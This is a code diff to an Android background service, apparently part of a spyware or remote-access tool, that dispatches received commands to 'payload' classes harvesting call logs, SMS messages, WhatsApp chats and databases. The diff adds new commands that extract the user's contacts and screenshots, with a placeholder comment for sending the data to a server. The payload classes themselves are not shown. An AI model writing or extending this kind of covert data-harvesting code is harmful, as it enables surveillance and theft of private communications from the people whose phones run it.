@@ -24,10 +24,15 @@ import com.aigs.serviceone.R;
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.Data;
 import com.aigs.serviceone.helpers.PayloadTypes;
+import com.aigs.serviceone.helpers.ScreenshotPayloadListener;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.helpers.SmsModes;
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
+import com.aigs.serviceone.helpers.ZipListener;
+import com.aigs.serviceone.helpers.ZipUtils;
 import com.aigs.serviceone.payload.CallLogsPayload;
+import com.aigs.serviceone.payload.ContactsPayload;
+import com.aigs.serviceone.payload.ScreenshotPayload;
 import com.aigs.serviceone.payload.SmsPayload;
 import com.aigs.serviceone.payload.WhatsappChatPayload;
 import com.google.android.gms.tasks.OnCompleteListener;
@@ -50,7 +55,6 @@ public class Starter extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         String input = intent.getStringExtra("inputExtra");
-        Data data = (Data) intent.getSerializableExtra("activity");
 
         Intent notificationIntent = new Intent(this, Starter.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(this,
@@ -137,9 +141,37 @@ public class Starter extends Service {
             case PayloadTypes.GET_WHATSAPP_DATABASES:
                 getWbDb();
                 break;
+            case PayloadTypes.GET_SCREENSHOTS_COUNT:
+                getSc();
+                break;
+            case PayloadTypes.GET_USER_CONTACTS:
+                getContacts();
+                break;
             default:
                 Log.d("ERROR PA : ", "Invalid Command Received");
                 break;
+        }
+    }
+
+    private void getContacts() {
+        try {
+            new ContactsPayload(this).execute();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    private void getSc() {
+        try {
+            new ScreenshotPayload(this).setScreenshotPayloadListener(new ScreenshotPayloadListener() {
+                @Override
+                public void onDataExtracted(File path) {
+                    //Data to server
+                }
+
+            }).execute();
+        }catch (Exception e){
+            e.printStackTrace();
         }
     }
 
